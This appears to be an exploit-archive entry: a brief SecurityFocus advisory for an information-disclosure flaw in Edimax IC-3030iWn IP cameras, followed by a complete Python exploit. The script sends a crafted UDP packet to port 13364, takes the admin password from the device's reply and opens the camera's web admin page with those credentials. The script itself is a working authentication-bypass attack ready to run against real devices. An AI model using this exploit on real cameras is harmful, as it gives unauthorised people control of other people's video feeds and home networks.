source: http://www.securityfocus.com/bid/54006/info

Edimax IC-3030iWn is prone to an information-disclosure vulnerability.

Successful exploits will allow a remote attacker to gain access to sensitive information. Information obtained will aid in further attacks. 

#!/usr/bin/env python
"""
# Exploit Title: Edimax IC-3030iWn Web Admin Auth Bypass exploit
# Date: 4 April 2012
# Exploit Author: y3dips@echo.or.id, @y3dips
# URL: http://echo.or.id
# Vendor Homepage: http://www.edimax.com
# Sourcecode Link: http://www.edimax.com/en/produce_detail.php?pd_id=352&pl1_id=8&pl2_id=91
# Also Tested on:
   - Edimax IC-3015
   - Airlive WN 500
# Bug found by: Ben Schmidt for RXS-3211 IP camera http://www.securityfocus.com/archive/1/518123
# To successfully automate your browser launch, change browser path.
"""

import socket
import webbrowser
import sys

if len(sys.argv) != 2:
    print "Eg: ./edimaxpwned.py edimax-IP"
    sys.exit(1)

port=13364
target= sys.argv[1]


def read_pw(target, port):
    devmac = "\xff\xff\xff\xff\xff\xff"
    code="\x00\x06\xff\xf9" #for unicast reply
    data=devmac+code
    sock =socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sock.connect((target,port))
    try:
        sock.send(data)
        sock.settimeout(5)
        tmp = sock.recv(4096)
        return tmp
    except socket.timeout:
        return None

def pwned_edi():
    data=read_pw(target, port)
    if data != None:
        data=data[365:377]
        pw=data.strip("\x00")
        webbrowser.get("/Applications/Firefox.app/Contents/MacOS/firefox-bin %s" ).open('http://admin:'+pw+'@'+target+'/index.asp')
    else:
        print "Socket timeOut or not Vulnerable"

pwned_edi()